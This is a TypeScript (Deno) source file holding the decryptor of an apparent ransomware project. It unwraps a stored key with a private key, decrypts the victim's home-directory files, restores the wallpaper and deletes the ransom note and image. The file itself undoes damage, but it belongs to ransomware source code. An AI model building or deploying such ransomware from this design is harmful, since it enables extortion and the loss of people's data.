import {
  decryptData,
  importPrivateKeyFromPem,
  unwrapSymmetricKey,
} from "../../utils/crypto.ts";
import {
  getHomedir,
  getImagePath,
  getMasterkeyPath,
  getNotePath,
  runForFiles,
} from "../../utils/path_utils.ts";
import { setBackground } from "../../utils/cmd_utils.ts";

export async function unperformRansom() {
  const homedir = getHomedir();
  if (!homedir) {
    return;
  }

  const privateKey = await importPrivateKeyFromPem(
    Deno.readTextFileSync("./private_key.pem"),
  );

  const masterkeyPath = getMasterkeyPath(homedir);
  const masterkey = JSON.parse(Deno.readTextFileSync(masterkeyPath));

  const symmetricKey = await unwrapSymmetricKey(
    Uint8Array.fromBase64(masterkey.key),
    privateKey,
  );

  const iv = Uint8Array.fromBase64(masterkey.iv);

  const changedHashes = new Map<string, string>(
    Object.entries(
      masterkey.changedHashes,
    ),
  );
  const newHashes = [...changedHashes.values()];

  await runForFiles(homedir, newHashes, async (entry, hash, data) => {
    const decryptedData = await decryptData(data, symmetricKey, iv);
    Deno.writeFileSync(entry.path, new Uint8Array(decryptedData));
    console.log(`Decrypted file with hash ${hash}`);
  });

  setBackground(masterkey.background);

  const imagePath = getImagePath(homedir);
  const notePath = getNotePath(homedir);
  const removeFiles = new Deno.Command("rm", {
    args: [
      masterkeyPath,
      imagePath,
      notePath,
    ],
  });
  removeFiles.outputSync();
}
